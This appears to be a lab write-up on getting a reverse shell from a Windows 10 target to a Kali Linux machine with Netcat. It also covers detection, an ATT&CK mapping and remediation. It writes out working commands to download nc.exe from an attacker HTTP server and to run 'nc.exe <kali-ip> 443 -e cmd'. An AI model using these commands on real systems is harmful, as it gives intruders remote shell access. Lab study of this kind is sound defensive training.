# Netcat Reverse Shell

## Objective

Demonstrate how a reverse shell can be established between a compromised Windows system and a Kali Linux attacker machine using Netcat.

## Lab Environment

- Attacker Machine: Kali Linux
- Target Machine: Windows 10
- Tool Used: Netcat (nc.exe)
- Communication Method: Reverse TCP Connection

## Netcat Overview

Netcat is a networking utility commonly used for reading from and writing to network connections using TCP or UDP protocols.

It is widely used by system administrators for troubleshooting and by security professionals during penetration testing for tasks such as port scanning, banner grabbing, file transfers, and reverse shell creation.

Due to its flexibility, Netcat is often referred to as the "Swiss Army Knife" of networking.

## File Transfer

A Netcat binary was transferred from Kali Linux to the target Windows machine using an HTTP server.

### Commands Used

```bash
cd /usr/share/windows-binaries

python2 -m SimpleHTTPServer 80
```

### Windows Download

```powershell
wget http://<kali-ip>/nc.exe -o nc.exe
```

### Findings

- Netcat executable was successfully transferred.
- File transfer was completed using HTTP.
- The target machine was prepared for reverse shell execution.

## Listener Setup

A Netcat listener was configured on Kali Linux to receive incoming reverse shell connections.

### Commands Used

```bash
nc -lvp 443
```

### Findings

- Listener started successfully.
- Kali Linux was ready to receive reverse shell connections.

## Reverse Shell Execution

A reverse shell was initiated from the Windows target to the Kali Linux attacker machine.

### Commands Used

```powershell
.\nc.exe <kali-ip> 443 -e cmd
```

### Findings

- Reverse shell connection was successfully established.
- Command execution was possible from the attacker machine.
- Access to the Windows command prompt was obtained.

## Alternative Reverse Shell Method

An additional reverse shell was generated using a PowerShell payload.

### Commands Used

```bash
nc -lvp 8080
```

### Steps Performed

- Generated a PowerShell reverse shell payload.
- Executed the payload on the target machine.
- Received a PowerShell session on Kali Linux.

### Findings

- PowerShell reverse shell was successfully established.
- Remote command execution was achieved.

## Attack Workflow

1. Transfer the Netcat executable to the target system.
2. Start an HTTP server on the attacker machine.
3. Download the Netcat binary on the Windows target.
4. Configure a Netcat listener on Kali Linux.
5. Execute Netcat on the target system.
6. Establish a reverse TCP connection to the attacker machine.
7. Obtain command execution through the remote shell.

## Detection Opportunities

Security teams can identify Netcat activity through:

- Unusual outbound network connections
- Execution of Netcat binaries on endpoints
- Connections to uncommon external ports
- Endpoint Detection and Response (EDR) alerts
- Suspicious command shell processes spawned by Netcat
- Network traffic associated with reverse shell activity

## MITRE ATT&CK Mapping

| Technique ID | Technique |
|-------------|-----------|
| T1059 | Command and Scripting Interpreter |
| T1105 | Ingress Tool Transfer |
| T1071 | Application Layer Protocol |
| T1059.003 | Windows Command Shell |
| T1021 | Remote Services |

## Security Impact

Reverse shells allow attackers to remotely execute commands and interact with compromised systems.

### Potential Risks

- Unauthorized remote access
- Command execution
- Data theft
- Lateral movement
- Privilege escalation opportunities

## Remediation

- Restrict outbound network traffic.
- Monitor suspicious PowerShell activity.
- Block unauthorized executable downloads.
- Implement Endpoint Detection and Response (EDR) solutions.
- Use application whitelisting.
- Monitor unusual outbound connections.

## Tools Used

- Netcat
- PowerShell
- Revshells.com
- Python HTTP Server
- Kali Linux
- Windows 10

## Key Learning

This lab demonstrated how reverse shells can be established using Netcat after successfully transferring tools to a target system.

The exercise reinforced concepts related to post-exploitation activities, remote command execution, attacker-controlled communication channels, and detection opportunities associated with reverse shell techniques.

Additionally, the lab highlighted the importance of monitoring outbound connections and executable downloads as part of defensive security operations.

## Disclaimer

This assessment was conducted in a controlled lab environment for educational and ethical security testing purposes only.